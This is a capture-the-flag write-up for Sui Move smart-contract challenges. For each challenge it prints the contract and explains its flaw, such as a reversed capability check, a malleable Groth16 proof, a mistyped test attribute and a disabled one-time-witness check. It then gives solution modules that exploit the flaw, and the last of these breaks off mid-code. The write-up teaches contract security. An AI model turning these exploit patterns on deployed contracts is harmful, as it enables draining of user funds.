# SUI basecamp CTF writeup

# **Dogwifcap**

challenge:

```rust
module challenge::dogwifcap{
    use sui::object::{Self, UID};
    use sui::tx_context::{Self, TxContext};
    use sui::transfer;
    // [*] Error Codes
    const ERR_INVALID_CODE : u64 = 31337;

    // [*] Structs
    struct Challenge has key {
        id: UID,
        level: u8,
        solved: bool
    }
    struct ChallengeCap has key, store {
        id: UID,
        for: address
    }

    // [*] Module initializer
    fun init(ctx: &mut TxContext) {
        transfer::share_object(Challenge {
            id: object::new(ctx),
            level: 0,
            solved: false
        })
    }

    // [*] Public functions
    public fun new_challenge(ctx: &mut TxContext): ChallengeCap {
        let challenge = Challenge {
            id: object::new(ctx),
            level: 0,
            solved: false
        };

        let cap = ChallengeCap {
            id: object::new(ctx),
            for: object::id_address(&challenge)
        };

        transfer::share_object(challenge);
        cap
    }

    public fun level_up(cap: &ChallengeCap, challenge: &mut Challenge) {
        assert!(cap.for != object::id_address(challenge), 0);

        challenge.level = challenge.level + 1;
        challenge.solved = true;
    }

    public entry fun is_solved(challenge: &mut Challenge) {
        assert!(challenge.solved == true, ERR_INVALID_CODE);
    }
}

```

During the publishing of this module, it instantiates a `Challenge` object and makes it a shared object.

> A quick disclaimer for those who haven't work with Sui before:
> A shared object is an object that has no owner and anyone can obtain a mutable reference to that object: `&mut Obj`.
> 

Our goal to solve the challenge is to set `challenge.solved` to `true`.

A common pattern in Sui when using shared objects is to instantiate two objects:

1. The shared object —> `Challenge` in this case
2. The shared object cap —> sent to the deployer, allowing privileged operations —> `ChallengeCap` in this case

## Solution

`level_up` is a privileged operation since it requires the `ChallengeCap`, however, the check that verifies if that `ChallengeCap` refers to the `Challenge` is incorrect.

```rust
assert!(cap.for != object::id_address(challenge), 0);
```

We can invoke `new_challenge` that generates a new `Challenge` and a new `ChallengeCap` . We can use this cap to invoke `level_up` with the old `Challenge` and solve the challenge.

```rust
module solution::dogwifcap_solution {
    use sui::tx_context::{Self, TxContext};
    use sui::object::{Self, UID};
    use challenge::dogwifcap;

    struct A has key{
        id: UID,
        cap: dogwifcap::ChallengeCap,
    }

    public entry fun solve(status: &mut dogwifcap::Challenge, ctx: &mut TxContext) {
        let cap = dogwifcap::new_challenge(ctx);
        dogwifcap::level_up(&cap,status);
        dogwifcap::is_solved(status);
        sui::transfer::share_object(A{
            id: object::new(ctx),
            cap});
    }
}
```

## **ZK Birthday**

challenge:

```rust
module challenge::zk_birthday{
    use sui::groth16;
    use sui::object::{Self, UID};
    use sui::tx_context::{Self, TxContext};
    use sui::transfer;
    // [*] Error Codes
    const ERR_INVALID_CODE : u64 = 31337;
    const E_USED_PROOF: u64 = 69420;

    // [*] Structs
    struct Status has key, store {
        id : UID,
        solved : bool,
    }
    struct VerifiedEvent has copy, drop {
        is_verified: bool,
    }
    // [*] Module initializer
    fun init(ctx: &mut TxContext) {
        transfer::public_share_object(Status {
            id: object::new(ctx),
            solved: false
        });
    }

    // [*] Public functions
    public(friend) fun get_flag(status: &mut Status) {
        status.solved = true;
    }

    public entry fun verify_proof(status: &mut Status, proof_points_bytes: vector<u8>) {    
        // Sets the vk and public_input_bytes
        let vk = vector[223, 127, 70, 111, 42, 128, 221, 6, 223, 219, 213, 123, 227, 125, 206, 24, 38, 35, 114, 35, 78, 126, 76, 96, 142, 254, 155, 13, 243, 158, 180, 44, 107, 157, 120, 124, 84, 241, 49, 145, 182, 67, 191, 237, 2, 218, 223, 83, 99, 23, 100, 200, 155, 196, 253, 144, 70, 248, 226, 245, 58, 73, 141, 22, 193, 168, 168, 138, 246, 134, 252, 179, 199, 60, 175, 130, 246, 197, 248, 180, 144, 26, 33, 165, 189, 151, 178, 30, 220, 108, 212, 80, 91, 94, 81, 176, 143, 93, 64, 156, 144, 92, 188, 222, 156, 30, 101, 36, 194, 224, 195, 91, 206, 22, 198, 205, 231, 95, 193, 29, 156, 237, 191, 51, 167, 66, 142, 37, 19, 255, 46, 77, 216, 179, 104, 147, 216, 26, 67, 49, 72, 251, 30, 130, 144, 167, 37, 103, 155, 4, 201, 171, 111, 94, 131, 105, 202, 56, 207, 40, 116, 90, 67, 111, 97, 38, 245, 142, 182, 36, 180, 124, 190, 157, 145, 85, 173, 206, 241, 78, 223, 135, 78, 102, 137, 194, 29, 175, 228, 164, 174, 5, 27, 21, 171, 186, 234, 119, 241, 162, 79, 157, 176, 70, 44, 232, 107, 104, 36, 206, 252, 152, 19, 35, 8, 58, 161, 45, 247, 187, 129, 208, 16, 140, 2, 0, 0, 0, 0, 0, 0, 0, 167, 130, 79, 120, 37, 23, 189, 141, 13, 138, 187, 180, 1, 136, 189, 24, 232, 164, 185, 227, 179, 198, 226, 215, 214, 80, 219, 109, 90, 65, 156, 26, 156, 95, 144, 76, 110, 165, 19, 53, 248, 23, 163, 59, 55, 152, 238, 138, 117, 115, 111, 108, 22, 198, 29, 204, 49, 133, 181, 135, 30, 223, 120, 166];
        let public_input_bytes =  vector[207, 170, 8, 74, 98, 96, 68, 36, 67, 115, 177, 149, 197, 217, 73, 104, 150, 229, 251, 254, 249, 91, 93, 44, 93, 174, 194, 194, 40, 15, 9, 17];
        let used_bday_proof_points = vector[57, 141, 203, 107, 222, 220, 114, 58, 154, 53, 174, 200, 52, 247, 40, 223, 182, 2, 214, 155, 208, 206, 224, 154, 200, 89, 254, 28, 42, 122, 213, 17, 181, 231, 101, 19, 6, 95, 253, 21, 197, 162, 68, 219, 76, 244, 38, 101, 10, 247, 137, 33, 246, 172, 58, 249, 208, 90, 140, 215, 226, 103, 198, 37, 250, 113, 165, 35, 124, 159, 176, 5, 145, 61, 156, 133, 215, 15, 97, 146, 204, 198, 90, 133, 130, 7, 25, 206, 83, 235, 176, 239, 81, 217, 148, 38, 172, 83, 38, 131, 163, 68, 108, 165, 205, 214, 214, 170, 168, 208, 139, 156, 170, 68, 198, 179, 177, 108, 203, 176, 240, 146, 154, 7, 157, 93, 172, 26, 19, 72, 167, 73, 182, 196, 35, 152, 236, 247, 20, 37, 69, 67, 123, 57, 26, 171, 211, 169, 78, 247, 189, 24, 219, 78, 161, 210, 93, 103, 209, 34, 162, 187, 158, 193, 207, 3, 198, 239, 81, 35, 240, 31, 0, 93, 21, 215, 137, 170, 24, 124, 188, 206, 42, 222, 181, 74, 100, 28, 75, 105, 255, 24, 23, 75, 250, 24, 105, 84, 208, 61, 249, 236, 176, 56, 203, 99, 42, 85, 95, 11, 13, 166, 239, 130, 47, 11, 201, 54, 107, 216, 141, 130, 149, 159, 74, 230, 117, 246, 218, 83, 239, 108, 149, 204, 88, 27, 224, 51, 194, 37, 54, 44, 134, 38, 214, 31, 178, 255, 31, 223, 112, 234, 81, 215, 93, 171];
        let pvk = groth16::prepare_verifying_key(&groth16::bn254(), &vk);
        let public_inputs = groth16::public_proof_inputs_from_bytes(public_input_bytes);
        // Check if provided proof NOT same as used proof
        assert!((used_bday_proof_points != proof_points_bytes),E_USED_PROOF);
        let proof_points = groth16::proof_points_from_bytes(proof_points_bytes);
        assert!((groth16::verify_groth16_proof(&groth16::bn254(), &pvk, &public_inputs, &proof_points)) == true, ERR_INVALID_CODE);
        get_flag(status);
    }

    public entry fun is_solved(status: &mut Status) {
        assert!(status.solved == true, 0);
    }
}
```

## Solution

![Untitled](img/Untitled%201.png)

```rust
module solution::zk_birthday_solution {
    use sui::tx_context::TxContext;
    use challenge::zk_birthday;

    public entry fun solve(status: &mut zk_birthday::Status) {
        let proof_points_bytes = vector[57, 141, 203, 107, 222, 220, 114, 58, 154, 53, 174, 200, 52, 247, 40, 223, 182, 2, 214, 155, 208, 206, 224, 154, 200, 89, 254, 28, 42, 122, 213, 17, 181, 231, 101, 19, 6, 95, 253, 21, 197, 162, 68, 219, 76, 244, 38, 101, 10, 247, 137, 33, 246, 172, 58, 249, 208, 90, 140, 215, 226, 103, 198, 37, 250, 113, 165, 35, 124, 159, 176, 5, 145, 61, 156, 133, 215, 15, 97, 146, 204, 198, 90, 133, 130, 7, 25, 206, 83, 235, 176, 239, 81, 217, 148, 38, 172, 83, 38, 131, 163, 68, 108, 165, 205, 214, 214, 170, 168, 208, 139, 156, 170, 68, 198, 179, 177, 108, 203, 176, 240, 146, 154, 7, 157, 93, 172, 26, 19, 72, 167, 73, 182, 196, 35, 152, 236, 247, 20, 37, 69, 67, 123, 57, 26, 171, 211, 169, 78, 247, 189, 24, 219, 78, 161, 210, 93, 103, 209, 34, 162, 187, 158, 193, 207, 3, 198, 239, 81, 35, 240, 31, 0, 93, 21, 215, 137, 170, 24, 124, 188, 206, 42, 222, 181, 74, 100, 28, 75, 105, 255, 24, 23, 75, 250, 24, 105, 84, 208, 61, 249, 236, 176, 56, 203, 99, 42, 85, 95, 11, 13, 166, 239, 130, 47, 11, 201, 54, 107, 216, 141, 130, 149, 159, 74, 230, 117, 246, 218, 83, 239, 108, 149, 204, 88, 27, 224, 51, 194, 37, 54, 44, 134, 38, 214, 31, 178, 255, 31, 223, 112, 234, 81, 215, 93, 171,0];
        zk_birthday::verify_proof(status,proof_points_bytes);
        zk_birthday::is_solved(status);
    }
}
```

## POW

challenge:

```rust
module challenge::pow {

    use sui::object::{Self, UID};
    use sui::tx_context::TxContext;
    use sui::transfer;

    const ENotSolved: u64 = 1234;

    struct Challenge has key {
        id: UID,
        is_solved: bool
    }

    struct ChallengeProof {
        data: vector<u8>,
    }

    fun init(ctx: &mut TxContext) {
        transfer::share_object(Challenge {
            id: object::new(ctx),
            is_solved: false
        })
    }

    public fun prepare_proof(data: vector<u8>): ChallengeProof {
        ChallengeProof {
            data
        }
    }

    public fun resolve_proof(challenge: &mut Challenge, proof: ChallengeProof) {
        let ChallengeProof { data } = proof;
        assert!(sui::object::id_to_address(&sui::object::uid_to_inner(&challenge.id)) 
                    == 
                sui::address::from_bytes(data), ENotSolved);

        challenge.is_solved = true;
    }

    public fun is_solved(challenge: &Challenge) {
        assert!(challenge.is_solved , ENotSolved);
    }
    
    public fun solved_bool(challenge: &Challenge): bool{
       challenge.is_solved
    }
}
```

The goal of this challenge was to set `is_solved` to `true` within the shared object generated during publishing. So, we need to generate a valid proof that would make this condition true:

```rust
        assert!(sui::object::id_to_address(&sui::object::uid_to_inner(&challenge.id)) 
                    == 
                sui::address::from_bytes(data), ENotSolved);
```

## Solution

```rust
    public entry fun solve(status: &mut pow::Challenge) {
            let a = address::to_bytes(object::id_address(status));
            let b = pow::prepare_proof(a);
            pow::resolve_proof(status,b);
    }
```

Due to modular encapsulation, we cannot access **`challenge.id`** directly. However, since we have a reference to the object, we can bypass this problem by using the function provided in their framework: **`object::id_address`**

```rust
    public fun id_address<T: key>(obj: &T): address {
        borrow_uid(obj).id.bytes
    }
```

# **Retetomat**

challenge:

```rust
module retetomat::version4 {

    use std::string::Self;
    // use std::ascii::Self;
    use std::vector;

    use sui::tx_context::{Self, TxContext};
    use sui::object::{Self, ID, UID};
    use sui::url::{Self, Url};
    use sui::transfer;
    use sui::event;

    const E_NotAdmin: u64 = 1337;
    const E_DoctorNotFound : u64 = 1338;
    const E_VMNotFound : u64 = 1339;
    const E_DoctorAlreadyExists : u64 = 1340;
    const E_NotExpensive : u64 = 1342;
    const E_VMAlreadyExists : u64 = 1341;

    #[allow(unused_const)]
    const ADMIN: address = @0x9a219ab86060165c5b290d6218bd42daa86ea85edd9decd81f352412e13647c3;
    #[allow(unused_const)]
    const DOCTOR: address = @0x47fa1f0a1e79172953f36a8ee0f438b31e420768152de742cd41ff74901b7888;
    #[allow(unused_const)]
    const VM: address = @0xA1C05;
    #[allow(unused_const)]
    const PATIENT: address = @0xdeadbeef;

    // ===================================================
    // [*] Resources
    public struct WhiteList has key, store {
        id: UID,
        doc_address: vector<address>,
        vm_address: vector<address>,
    }

    public struct Reteta has key, store {
        id: UID,
        name: string::String,
        description: string::String,
        image_url: Url,
        price: u64,
        date: string::String,
        drugs: vector<string::String>
    }
    
    public struct RetetaMinted has copy, drop {
        reteta_id: ID,
        minted_by: address,
    }

    public struct RetetaBurned has copy, drop {
        items: vector<string::String>,
        burned_by: address,
    }

    // ===================================================
    // [*] Module constructor
    fun init(ctx: &mut TxContext) {

        transfer::share_object(WhiteList {
            id: object::new(ctx),
            doc_address: vector::empty<address>(),
            vm_address: vector::empty<address>()
        })

    }

    // ===================================================
    // [*] Admin functionality to manipulate whitelist 
    //     (add / remove : doctor / vending machine)
    public entry fun add_doc(
        whitelist: &mut WhiteList, 
        doctor_address: address, 
        ctx: &mut TxContext
    ) {
        assert!(tx_context::sender(ctx) == ADMIN, E_NotAdmin);
        assert!(!vector::contains(&whitelist.doc_address, &doctor_address), E_DoctorAlreadyExists);
        vector::push_back(&mut whitelist.doc_address, doctor_address);
    }

    public entry fun remove_doc(
        whitelist: &mut WhiteList, 
        doctor_address: address, 
        ctx: &mut TxContext
    ) {
        assert!(tx_context::sender(ctx) == ADMIN, E_NotAdmin);
        let (exists, i) = vector::index_of(&whitelist.doc_address, &doctor_address);
        assert!(exists == true, E_DoctorNotFound);
        vector::remove(&mut whitelist.doc_address, i);
    }
   
    public entry fun add_vm(
        whitelist: &mut WhiteList, 
        vending_machine_address: address, 
        ctx: &mut TxContext
    ) {
        assert!(tx_context::sender(ctx) == ADMIN, E_NotAdmin);
        assert!(!vector::contains(&whitelist.vm_address, &vending_machine_address), E_VMAlreadyExists);
        vector::push_back(&mut whitelist.vm_address, vending_machine_address);
    }

    public entry fun remove_vm(
        whitelist: &mut WhiteList, 
        vending_machine_address: address, 
        ctx: &mut TxContext
    ) {
        assert!(tx_context::sender(ctx) == @retetomat, E_NotAdmin);
        let (exists, i) = vector::index_of(&whitelist.vm_address, &vending_machine_address);
        assert!(exists == true, E_VMNotFound);
        vector::remove(&mut whitelist.vm_address, i);
    }

    // ===================================================
    // [*] Doctor functionality to mint NTFs
    public entry fun mint(
        whitelist: &WhiteList,
        patient: address,
        name: string::String,
        description: string::String,
        price: u64,
        date: string::String,
        drugs: vector<string::String>,
        image_url: string::String,
        ctx: &mut TxContext
    ) {
        let doctor = tx_context::sender(ctx);
        assert!(vector::contains(&whitelist.doc_address, &doctor), E_DoctorNotFound);

        let id = object::new(ctx);
        event::emit(RetetaMinted {
            reteta_id: object::uid_to_inner(&id),
            minted_by: tx_context::sender(ctx),
        });

        let nft = Reteta { 
            id: id, 
            name: name, 
            description: description,
            image_url: url::new_unsafe(string::to_ascii(image_url)) ,
            price: price,
            date: date, 
            drugs: drugs
        };
        transfer::public_transfer(nft, patient);
    }

    // ===================================================
    // [*] Vending Machine functionality to burn NFTs
    public entry fun destroy(
        _whitelist: &mut WhiteList, 
        reteta: Reteta, 
        ctx: &mut TxContext
    ) {
        let burner_addr = tx_context::sender(ctx); 
        // assert!(vector::contains(&whitelist.vm_address, &vm), E_VMNotFound);

        let Reteta { id, name: _, description: _, image_url: _, price: _, date: _, drugs } = reteta;
        object::delete(id);

        event::emit(RetetaBurned {
            items: drugs,
            burned_by: burner_addr, // owner or vending machine
        });
    }

    // ===================================================
    // [*] Patients functionality to inspect NTFs
    public fun get_name(reteta: &Reteta): string::String { reteta.name }

    public fun get_description(reteta: &Reteta): string::String { reteta.description }

    public fun get_items(reteta: &Reteta): &vector<string::String> { &reteta.drugs }

    public fun get_url(reteta: &Reteta): Url { reteta.image_url }

    public fun get_price(reteta: &Reteta): u64 { reteta.price }

    public fun get_doctors(whitelist: &WhiteList): vector<address> { whitelist.doc_address }

    public fun get_vms(whitelist: &WhiteList): vector<address> { whitelist.vm_address }

    public fun is_expensive(reteta: &Reteta) {
        assert!(*string::bytes(vector::borrow(get_items(reteta), 1)) == b"Onasemnogene", E_NotExpensive);
    }

    // ===================================================
    // [*] TESTS

    #[test_only]
    use std::debug;
    #[test_only]
    use sui::test_scenario::{Self, ctx};
    // #[test_only]
    // use sui::coin::{Self, Coin};
    // #[test_only]
    // use sui::sui::SUI;
    #[test_only]
    use sui::random::{Self, Random, new_generator};

    // use retetomat::version1;

    #[test]
    public fun test_admin() {
        // deploy contract
        let mut scenario_val = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_val;

        // let coin = coin::mint_for_testing<SUI>(100, ctx(scenario));
        init(ctx(scenario));

        // add doctor to whitelist
        test_scenario::next_tx(scenario, ADMIN);

        let mut whitelist = test_scenario::take_shared<WhiteList>(scenario);

        add_doc(&mut whitelist, DOCTOR, ctx(scenario));
        let doctors = get_doctors(&whitelist);
        debug::print(&doctors);

        test_scenario::return_shared(whitelist);
        test_scenario::end(scenario_val);
    }

    #[test_only]
    public fun create_grugs_list() : vector<string::String> {
        let mut drugs : vector<string::String> = vector::empty();
        vector::push_back(&mut drugs, string::utf8(b"Advil"));
        vector::push_back(&mut drugs, string::utf8(b"Strepsils"));
        drugs
    }

    #[test]
    public fun test_doctor() {
        // deploy contract
        let mut scenario_val = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_val;

        init(ctx(scenario));

        // add doctor to whitelist
        test_scenario::next_tx(scenario, ADMIN);

        let mut whitelist = test_scenario::take_shared<WhiteList>(scenario);
        add_doc(&mut whitelist, DOCTOR, ctx(scenario));
        let doctors = get_doctors(&whitelist);
        debug::print(&doctors);
        test_scenario::return_shared(whitelist);

        test_scenario::next_tx(scenario, DOCTOR);
        whitelist = test_scenario::take_shared<WhiteList>(scenario);
        let patient = PATIENT;
        let name = create_patient_name(ctx(scenario));
        let description = string::utf8(b"For constant pain");
        let price = 12;
        let date = string::utf8(b"10.11.2024");
        let mut drugs : vector<string::String> = create_grugs_list();
        let url = string::utf8(b"https://imgur.com");
        mint(&whitelist, patient, name, description, price, date, drugs, url, ctx(scenario));
        test_scenario::return_shared(whitelist);

        test_scenario::end(scenario_val);
    }

    #[test_only]
    public fun create_patient_name(ctx: &mut TxContext) : string::String {
        let mut name_options : vector<string::String> = vector::empty();
        vector::push_back(&mut name_options, string::utf8(b"Mark"));
        vector::push_back(&mut name_options, string::utf8(b"John"));
        vector::push_back(&mut name_options, string::utf8(b"Alex"));
        vector::push_back(&mut name_options, string::utf8(b"Michael"));
        vector::push_back(&mut name_options, string::utf8(b"David"));

        let r : Random = Random::new();
        let generator = new_generator(r, ctx);
        let index = random::generate_u32_in_range(&mut generator, 0, vector::length(&name_options));
        *vector::borrow(&mut name_options, index)
    }

    #[test]
    public fun test_patient_redeem_drugs() {
        // deploy contract
        let mut scenario_val = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_val;

        init(ctx(scenario));

        // add doctor to whitelist
        test_scenario::next_tx(scenario, ADMIN);

        let mut whitelist = test_scenario::take_shared<WhiteList>(scenario);
        add_doc(&mut whitelist, DOCTOR, ctx(scenario));
        let doctors = get_doctors(&whitelist);
        debug::print(&doctors);
        test_scenario::return_shared(whitelist);

        test_scenario::next_tx(scenario, DOCTOR);
        whitelist = test_scenario::take_shared<WhiteList>(scenario);
        let patient = PATIENT;
        let name = create_patient_name(ctx(scenario));
        let description = string::utf8(b"For constant pain");
        let price = 12;
        let date = string::utf8(b"10.11.2024");
        let mut drugs : vector<string::String> = create_grugs_list();
        let url = string::utf8(b"https://imgur.com");
        mint(&whitelist, patient, name, description, price, date, drugs, url, ctx(scenario));
        test_scenario::return_shared(whitelist);

        // patient redeems drugs
        test_scenario::next_tx(scenario, PATIENT);

        let reteta = test_scenario::take_from_sender<Reteta>(scenario);
        whitelist = test_scenario::take_shared<WhiteList>(scenario);
        destroy(&mut whitelist, reteta, ctx(scenario));

        test_scenario::return_shared(whitelist);

        test_scenario::end(scenario_val);
    }

    #[test_cnly]
    public fun debug_reteta_creation(
        name: string::String,
        description: string::String,
        price: u64,
        date: string::String,
        drugs: vector<string::String>,
        image_url: string::String,
        ctx: &mut TxContext
    ) {
        let id = object::new(ctx);

        let nft = Reteta { 
            id: id, 
            name: name, 
            description: description,
            image_url: url::new_unsafe(string::to_ascii(image_url)) ,
            price: price,
            date: date, 
            drugs: drugs
        };

        transfer::public_transfer(nft, tx_context::sender(ctx));
    }

    #[test]
    public fun test_multiple_reteta() {
         // deploy contract
        let mut scenario_val = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_val;

        init(ctx(scenario));

        // add doctor to whitelist
        test_scenario::next_tx(scenario, ADMIN);

        let mut whitelist = test_scenario::take_shared<WhiteList>(scenario);
        add_doc(&mut whitelist, DOCTOR, ctx(scenario));
        let doctors = get_doctors(&whitelist);
        debug::print(&doctors);
        test_scenario::return_shared(whitelist);

        test_scenario::next_tx(scenario, DOCTOR);
        whitelist = test_scenario::take_shared<WhiteList>(scenario);
        let patient = PATIENT;
        let name = create_patient_name(ctx(scenario));
        let description = string::utf8(b"For constant pain");
        let price = 12;
        let date = string::utf8(b"10.11.2024");
        let mut drugs : vector<string::String> = create_grugs_list();
        let url = construct_url(string::utf8(b"https://"), string::utf8(b"www."), string::utf8(b"example."), string::utf8(b"co.uk"), string::utf8(b":80"), string::utf8(b"/blog/article/search"), string::utf8(b"?"), string::utf8(b"docid=720&hl=en"), string::utf8(b"#dayone"));
        mint(&whitelist, patient, name, description, price, date, drugs, url, ctx(scenario));
        test_scenario::return_shared(whitelist);

        // patient redeems drugs
        test_scenario::next_tx(scenario, PATIENT);

        let reteta = test_scenario::take_from_sender<Reteta>(scenario);
        whitelist = test_scenario::take_shared<WhiteList>(scenario);
        destroy(&mut whitelist, reteta, ctx(scenario));

        test_scenario::return_shared(whitelist);

        test_scenario::end(scenario_val);

    }

    #[test_only]
    public fun construct_url(
        scheme: &mut string::String,
        subdomain: string::String,
        domain: string::String,
        top_lvl_domain: string::String,
        port: string::String,
        path: string::String,
        query_separator: string::String,
        query_parameters: string::String,
        fragment: string::String,
        ctx: &mut TxContext
    ) : string::String {
        string::append(scheme, dubdomain);
        string::append(scheme, domain);
        string::append(scheme, top_lvl_domain);
        string::append(scheme, port);
        string::append(scheme, path);
        string::append(scheme, query_separator);
        string::append(scheme, query_parameters);
        string::append(scheme, fragment);
        return scheme
    }
    #[test_only]
    public fun debug_reteta_creation(
        name: string::String,
        description: string::String,
        price: u64,
        date: string::String,
        drugs: vector<string::String>,
        image_url: string::String,
        ctx: &mut TxContext
    ): Reteta {
        let id = object::new(ctx);

        let nft = Reteta { 
            id: id, 
            name: name, 
            description: description,
            image_url: url::new_unsafe(string::to_ascii(image_url)) ,
            price: price,
            date: date, 
            drugs: drugs
        };

        nft
    }

}
```

During the publishing, the protocol generates a shared object: `WhiteList` .

The functionalities of the protocol are limited.
Operations that can be only performed by the `@admin/@retetomat` :

- `add_doc` —> that add an address in `whitelist.doc_address`
- `remove_doc` —> that remove an address from `whitelist.doc_address`
- `add_vm` —> that add an address in `whitelist.vm_address`
- `remove_vm` —> that remove an address from `whitelist.vm_address`

Operations that can be only performed if the singer of the transaction is in `whitelist.doc_address` :

- `mint` that mint a new `Reteta` NFT.

Operations that don’t require any privileges:

- `destroy` used to burn a `Reteta`
- get function for `Reteta`

The goal of this challenge is to invoke `is_expensive` with a valid `Reteta` 

```rust
    public fun is_expensive(reteta: &Reteta) {
        assert!(*string::bytes(vector::borrow(get_items(reteta), 1)) == b"Onasemnogene", E_NotExpensive);
    }
```

## Solution

There is a typo in the test function that allows any user to mint a `Retata` :

```
    #[test_cnly]
    public fun debug_reteta_creation(
        name: string::String,
        description: string::String,
        price: u64,
        date: string::String,
        drugs: vector<string::String>,
        image_url: string::String,
        ctx: &mut TxContext
    ) {
        let id = object::new(ctx);

        let nft = Reteta { 
            id: id, 
            name: name, 
            description: description,
            image_url: url::new_unsafe(string::to_ascii(image_url)) ,
            price: price,
            date: date, 
            drugs: drugs
        };

        transfer::public_transfer(nft, tx_context::sender(ctx));
    }
```

we can invoke this function with valid data and solve this challenge:

```rust
module vending_machine::versionC {

    use sui::tx_context::{TxContext};
    use std::vector;
    use retetomat::version4::{Self, WhiteList,Reteta};
    use std::string::Self;
    use sui::object::{Self, UID};

    public entry fun solve( 
        whitelist: &mut WhiteList, 
        ctx: &mut TxContext
    ) {
       let mut i = 0;
       while ( i < 20 ){
        version4::debug_reteta_creation(
            string::utf8(x""),
            string::utf8(x""),
            1,
            string::utf8(x""),
            vector<string::String>[string::utf8(vector<u8>[79, 110, 97, 115, 101, 109, 110, 111, 103, 101, 110, 101]),string::utf8(vector<u8>[79, 110, 97, 115, 101, 109, 110, 111, 103, 101, 110, 101])],
            string::utf8(x""),
            ctx
            );
            i = i +1;
        }
       
    }

}
```

# **Deep Pockets**

challenge:

```rust
module deep_pockets::deep_pockets {
	use sui::{table::{Self, Table}, balance::{Self, Balance, Supply}, coin::{Self, Coin}};
	public struct SUSD has drop {}
	public struct SEUR has drop {}
	public struct SUI has drop {}

	public struct Account has store {
		bal_usd: u64,
		bal_eur: u64,
		debt_eur: u64,
	}

	public struct AccountCap has key, store {
		id: UID,
	}

	public struct AdminCap has key, store {
		id: UID,
	}

	public struct SupplyHolder<phantom T> has key {
		id: UID,
		supply: Supply<T>,
	}

	public struct Deep<phantom T> has key {
		id: UID,
		accounts: Table<ID, Account>,
		vault_usd: Balance<SUSD>,
		vault_eur: Balance<SEUR>,
		interest_bp: u64,
	}

	fun burn_supply<T>(sup: Supply<T>, ctx: &mut TxContext) {
		transfer::freeze_object(SupplyHolder {
			id: object::new(ctx),
			supply: sup
		});
	}
	
	fun init(ctx: &mut TxContext) {
		let mut sup = balance::create_supply(SUI {});
		let b1 = balance::increase_supply(&mut sup, 1);
		let b2 = balance::increase_supply(&mut sup, 1);
		let c1 = coin::from_balance(b1, ctx);
		let c2 = coin::from_balance(b2, ctx);
		// community coin
		transfer::public_share_object(c2);
		burn_supply(sup, ctx);

		let mut sup_usd = balance::create_supply(SUSD {});
		let mut sup_eur = balance::create_supply(SEUR {});
		let c_usd = coin::from_balance(balance::increase_supply(&mut sup_usd, 100), ctx);
		// sharing is caring
		transfer::public_share_object(c_usd);
		let c_eur = coin::from_balance(balance::increase_supply(&mut sup_eur, 1000), ctx);

		let AdminCap { id } = create_protocol(SUI {}, c1, c_eur, ctx);
		object::delete(id);

		burn_supply(sup_usd, ctx);
		burn_supply(sup_eur, ctx);
	}

	public fun create_protocol<T: drop>(_witness: T, fee: Coin<SUI>, initial_eur: Coin<SEUR>, ctx: &mut TxContext): AdminCap {
		assert!(coin::value(&fee) == 1, 1);
		// assert!(types::is_one_time_witness(&witness), 2);
		transfer::public_freeze_object(fee);
		transfer::share_object(Deep<T> {
			id: object::new(ctx),
			accounts: table::new(ctx),
			vault_usd: balance::zero(),
			vault_eur: coin::into_balance(initial_eur),
			interest_bp: 20000,
		});
		AdminCap {
			id: object::new(ctx),
		}
	}

	public fun change_interest<T>(deep: &mut Deep<T>, _cap: &AdminCap, interest_bp: u64) {
		deep.interest_bp = interest_bp;
	}

	public fun create_account<T>(deep: &mut Deep<T>, ctx: &mut TxContext): AccountCap {
		let cap = AccountCap {
			id: object::new(ctx)
		};
		table::add(&mut deep.accounts, object::id(&cap), Account {
			bal_usd: 0,
			bal_eur: 0,
			debt_eur: 0,
		});
		cap
	}

	public entry fun create_account_entry<T>(deep: &mut Deep<T>, ctx: &mut TxContext) {
		let cap = create_account(deep, ctx);
		transfer::transfer(cap, tx_context::sender(ctx));
	}

	public fun deposit_usd<T>(deep: &mut Deep<T>, cap: &AccountCap, usd: Coin<SUSD>) {
		let account = table::borrow_mut(&mut deep.accounts, object::id(cap));
		account.bal_usd = account.bal_usd + coin::value(&usd);
		balance::join(&mut deep.vault_usd, coin::into_balance(usd));
	}

	// we currently don't pay interest to lenders
	public fun deposit_eur<T>(deep: &mut Deep<T>, cap: &AccountCap, eur: Coin<SEUR>) {
		let account = table::borrow_mut(&mut deep.accounts, object::id(cap));
		account.bal_eur = account.bal_eur + coin::value(&eur);
		balance::join(&mut deep.vault_eur, coin::into_balance(eur));
	}

	fun check_invariant(account: &Account) {
		// not enough collateral
		assert!(account.debt_eur <= account.bal_usd * 7000 / 10000, 0);
	}

	public fun withdraw_usd<T>(deep: &mut Deep<T>, cap: &AccountCap, amount: u64, ctx: &mut TxContext): Coin<SUSD> {
		let account = table::borrow_mut(&mut deep.accounts, object::id(cap));
		account.bal_usd = account.bal_usd - amount;
		check_invariant(account);
		coin::from_balance(balance::split(&mut deep.vault_usd, amount), ctx)
	}

	public fun withdraw_eur<T>(deep: &mut Deep<T>, cap: &AccountCap, amount: u64, ctx: &mut TxContext): Coin<SEUR> {
		let account = table::borrow_mut(&mut deep.accounts, object::id(cap));
		account.bal_eur = account.bal_eur - amount;
		check_invariant(account);
		coin::from_balance(balance::split(&mut deep.vault_eur, amount), ctx)
	}

	public fun borrow<T>(deep: &mut Deep<T>, cap: &AccountCap, amount: u64, ctx: &mut TxContext): Coin<SEUR> {
		let account = table::borrow_mut(&mut deep.accounts, object::id(cap));
		// interest is 100% of the borrowed amount, payable at any point
		account.debt_eur = account.debt_eur + amount * deep.interest_bp / 10000;
		check_invariant(account);
		coin::from_balance(balance::split(&mut deep.vault_eur, amount), ctx)
	}
}

```

Our goal for this challenge is to drain the `eur` vault on the `Deep` shared object.

## Solution

The problem lies in the **`create_protocol`** function. This function creates a new instance of the shared object **`Deep`** and returns an **`AdminCap`**, which is useful for performing all privileged operations. Theoretically, this function should only be executed if we have an OTW, but the check in this case has been commented out.

> A one-time witness (OTW) is a special type that is guaranteed to have at most one instance. It is useful for limiting certain actions to only happen once.
> 

Once we obtain an  **`AdminCap`** , we can invoke **`change_interest`** with the old **`Deep`** and the **`AdminCap`** and set the fee to 0. By invoking **`borrow`**, we can drain the account, and our debt will remain at zero, avoiding triggering the **`assert`** in **`check_invariant`**

```rust
module exp::exp {
    use deep_pockets::deep_pockets;
    use sui::coin::{Coin,Self};

    public struct A has drop {}
